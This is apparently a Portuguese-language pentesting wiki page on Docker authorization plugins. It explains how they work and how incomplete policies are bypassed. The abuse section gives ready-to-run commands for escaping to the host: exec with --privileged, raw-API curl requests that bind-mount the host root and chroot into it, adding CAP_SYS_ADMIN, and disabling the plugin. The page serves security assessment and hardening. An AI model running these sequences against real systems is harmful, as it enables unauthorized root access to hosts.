# Plugins de autorização em tempo de execução

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Plugins de autorização em tempo de execução são uma camada extra de políticas que decide se um chamador pode executar determinada ação do daemon. O Docker é o exemplo clássico. Por padrão, qualquer pessoa que consiga se comunicar com o daemon do Docker tem, na prática, amplo controle sobre ele. Os plugins de autorização tentam restringir esse modelo examinando o usuário autenticado e a operação de API solicitada e, em seguida, permitindo ou negando a solicitação de acordo com a política.

Este tópico merece sua própria página porque muda o modelo de exploração quando um atacante já tem acesso a uma API do Docker ou a um usuário do grupo `docker`. Nesses ambientes, a questão já não é apenas "consigo alcançar o daemon?", mas também "o daemon está protegido por uma camada de autorização e, em caso afirmativo, é possível contorná-la por endpoints não tratados, parsing fraco de JSON ou permissões de gerenciamento de plugins?"

## Funcionamento

Quando uma solicitação chega ao daemon do Docker, o subsistema de autorização pode encaminhar o contexto da solicitação para um ou mais plugins instalados. O plugin recebe a identidade do usuário autenticado, os detalhes da solicitação, os cabeçalhos selecionados e partes do corpo da solicitação ou da resposta, quando o tipo de conteúdo é compatível. Vários plugins podem ser encadeados, e o acesso só é concedido se todos os plugins permitirem a solicitação.

Esse modelo parece sólido, mas sua segurança depende inteiramente de quão bem o autor da política compreendeu a API. Um plugin que bloqueia `docker run --privileged`, mas ignora `docker exec`, não trata chaves JSON alternativas, como `Binds` no nível superior, ou permite o gerenciamento de plugins pode criar uma falsa sensação de restrição, embora ainda deixe abertos caminhos diretos para escalonamento de privilégios.

## Alvos comuns dos plugins

Áreas importantes para revisar nas políticas:

- endpoints de criação de containers
- campos de `HostConfig`, como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` e opções de compartilhamento de namespace
- comportamento de `docker exec`
- endpoints de gerenciamento de plugins
- qualquer endpoint que possa acionar indiretamente ações de runtime fora do modelo de política pretendido

Historicamente, exemplos como o plugin `authz` do Twistlock e plugins educacionais simples, como o `authobot`, tornaram esse modelo fácil de estudar, pois seus arquivos de política e caminhos de código mostravam como o mapeamento de endpoint para ação era realmente implementado. Em trabalhos de avaliação, a lição importante é que o autor da política precisa compreender toda a superfície da API, e não apenas os comandos mais visíveis da CLI.

## Abuso

O primeiro objetivo é descobrir o que realmente está bloqueado. Se o daemon negar uma ação, o erro frequentemente leak o nome do plugin, o que ajuda a identificar o controle em uso:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Se você precisar de uma análise mais ampla dos endpoints, ferramentas como `docker_auth_profiler` são úteis porque automatizam a tarefa, que de outro modo seria repetitiva, de verificar quais rotas de API e estruturas JSON são realmente permitidas pelo plugin.

Se o ambiente usar um plugin personalizado e você puder interagir com a API, enumere quais campos de objetos são realmente filtrados:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Essas verificações são importantes porque muitas falhas de autorização são específicas de campos, e não de conceitos. Um plugin pode rejeitar um padrão da CLI sem bloquear completamente a estrutura equivalente da API.

### Exemplo completo: `docker exec` adiciona privilégios após a criação do container

Uma política que bloqueia a criação de containers privilegiados, mas permite a criação de containers sem confinamento e o uso de `docker exec`, ainda pode ser contornada:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Se o daemon aceitar a segunda etapa, o usuário terá recuperado um processo interativo privilegiado dentro de um container que o autor da política acreditava estar restrito.

Uma regra restrita de `sudo` pode expor a mesma rota mesmo quando o chamador não consegue acessar diretamente o socket do Docker. Por exemplo, uma permissão para executar como root `/usr/bin/docker exec *` pode permitir que o chamador forneça as opções `--privileged` e `--user root` do Docker. Ainda é necessário haver um container em execução; em alguns hosts Linux, seu ID fica visível na linha de comando de um processo `containerd-shim` quando `docker ps` é negado. Trate a regra como uma pista para revisão: confirme a política efetiva do sudo, os controles de autorização do daemon, os user namespaces e se o processo resultante consegue acessar um dispositivo do host ou um mount gravável do host. O Docker documenta as opções de exec em sua [referência da CLI](https://docs.docker.com/reference/cli/docker/container/exec/).

Um wrapper executado como root que aceita um arquivo Compose escolhido pelo chamador precisa validar todo o [modelo de serviços do Compose](https://docs.docker.com/reference/compose-file/services/), e não apenas rejeitar `privileged: true` e exigir `:ro` em bind mounts. Revise `cap_add`, `security_opt`, dispositivos, namespaces, entradas de build e todas as sintaxes de volume compatíveis. Um bind mount somente leitura ainda pode se tornar gravável de dentro de um container com capabilities adequadas e confinamento de segurança relaxado, dependendo da política do daemon e do kernel. Listas de permissões de caminhos do host baseadas apenas em prefixos e verificações de symlink apenas no componente final do caminho também precisam ser revisadas. Uma regra de sudo e uma chamada literal a `docker-compose up` identificam um caso candidato; a validação efetiva do wrapper e as restrições do daemon em tempo de execução determinam se ele é explorável.

### Exemplo completo: Bind Mount por meio da API bruta

Algumas políticas defeituosas inspecionam apenas uma estrutura JSON. Se o bind mount do sistema de arquivos raiz não for bloqueado de forma consistente, ainda será possível montar o host:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

A mesma ideia também pode aparecer em `HostConfig`:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

O impacto é um escape completo do sistema de arquivos do host. O detalhe interessante é que o bypass decorre de uma cobertura incompleta da política, e não de um bug do kernel.

### Exemplo completo: atributo de capability não verificado

Se a política se esquecer de filtrar um atributo relacionado a capability, o atacante poderá criar um contêiner que recupera uma capability perigosa:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Assim que `CAP_SYS_ADMIN` ou uma capability igualmente poderosa estiver disponível, muitas técnicas de escape descritas em [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) tornam-se acessíveis.

### Exemplo completo: desativando o plugin

Se as operações de gerenciamento de plugins forem permitidas, o bypass mais simples pode ser desativar o controle por completo:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Esta é uma falha de política no nível do plano de controle. A camada de autorização existe, mas o usuário que ela deveria restringir ainda mantém a permissão para desativá-la.

## Verificações

Estes comandos visam identificar se existe uma camada de política e se ela parece completa ou superficial.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

O que é interessante aqui:

- Mensagens de negação que incluem o nome de um plugin confirmam uma camada de autorização e muitas vezes revelam a implementação exata.
- Uma lista de plugins visível para o atacante pode ser suficiente para descobrir se é possível desativar ou reconfigurar operações.
- Uma política que bloqueia apenas ações óbvias da CLI, mas não solicitações brutas à API, deve ser considerada contornável até que se prove o contrário.

## Padrões de runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Não habilitado por padrão | O acesso ao daemon é efetivamente tudo ou nada, a menos que um plugin de autorização esteja configurado | política de plugin incompleta, listas de bloqueio em vez de listas de permissões, permitir o gerenciamento de plugins, pontos cegos no nível de campo |
| Podman | Não há um equivalente direto comum | O Podman normalmente depende mais de permissões Unix, execução rootless e decisões sobre exposição da API do que de plugins authz no estilo Docker | expor amplamente uma API rootful do Podman, permissões fracas no socket |
| containerd / CRI-O | Modelo de controle diferente | Esses runtimes geralmente dependem de permissões do socket, limites de confiança dos nós e controles de orquestradores em camadas superiores, em vez de plugins authz do Docker | montar o socket nos workloads, pressupostos fracos de confiança local no nó |
| Kubernetes | Usa authn/authz nas camadas do API server e do kubelet, não plugins authz do Docker | RBAC do cluster e controles de admissão são a principal camada de política | RBAC excessivamente permissivo, política de admissão fraca, exposição direta das APIs do kubelet ou do runtime |

{{#include ../../../banners/hacktricks-training.md}}
